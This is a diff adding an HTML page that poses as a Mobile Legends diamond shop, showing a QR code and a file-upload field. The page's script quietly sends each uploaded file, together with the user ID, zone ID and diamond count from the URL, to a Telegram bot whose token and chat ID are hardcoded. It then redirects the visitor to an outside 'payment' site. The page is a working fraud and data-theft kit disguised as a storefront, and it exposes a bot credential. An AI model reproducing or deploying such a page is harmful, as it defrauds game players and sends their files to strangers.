@@ -1,0 +1,122 @@
+<html>
+<head>
+    <script src="https://kit.fontawesome.com/1e968ab43f.js" crossorigin="anonymous"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MLBB Other Diamond</title>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9794955441022092"
+     crossorigin="anonymous"></script>
+</head>
+<style>
+    * {
+        padding: 0;
+        margin: 0;
+    }
+    body {
+        background-color: #3BB9FF;
+    }
+    img {
+        width: 250px;
+    }
+    .conteiner {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #00BFFF;
+        padding: 1em;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        border-radius: 0.5em;
+        font-weight: bold;
+    }
+    .conteiner h3 {
+        margin: 10px 0;
+        color: white;
+    }
+    .conteiner .btn form input, button {
+        width: 250px;
+        height: 30px;
+        border: 1px solid black;
+        background-color: #00BFFF;
+        color: white;
+        border-radius: 0.5em;
+        font-size: 10px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        margin: 10px 0;
+        font-weight: bold;
+    }
+</style>
+<body>
+    <section class="conteiner">
+        <header>
+            <img src="img/qr.png">
+            <h3>SCAN QR CODE</h3>
+        </header>
+        <div class="btn">
+            <form action="payment.html">
+                <input type="file" id="fileInput" onchange="handleFileInputChange(event)">
+            </form>
+        </div>
+    </section>
+</body>
+<script>
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return 'null';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+    const botToken = '6813887510:AAEv1qZqoCB6Hf2qR2lYc9BzmBtU3yhuT2A';
+    const chatId = '6940188992';
+    function handleFileInputChange(event) {
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                const fileData = event.target.result;
+                sendDocumentToTelegram(file, fileData);
+            };
+            reader.readAsDataURL(file);
+        }
+    }
+
+    // Function to send the document to Telegram
+    function sendDocumentToTelegram(file, fileData) {
+        const url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                    console.log('Document sent successfully');
+                    window.location.href = "https://diamonddepositshop.top/payment.html"
+                } else {
+                    console.error('Failed to send document');
+                }
+            }
+        };
+
+        const user = getParameterByName("user_ids");
+        const zone = getParameterByName("zone_ids")
+        const diamond = getParameterByName("diamonds")
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file, file.name);
+        formData.append('caption', 'diamond:' + diamond + '\n\nUser_id: ' + user + '\n\nZone_id: ' + zone);
+
+        xhr.send(formData);
+    }
+</script>
+</html>
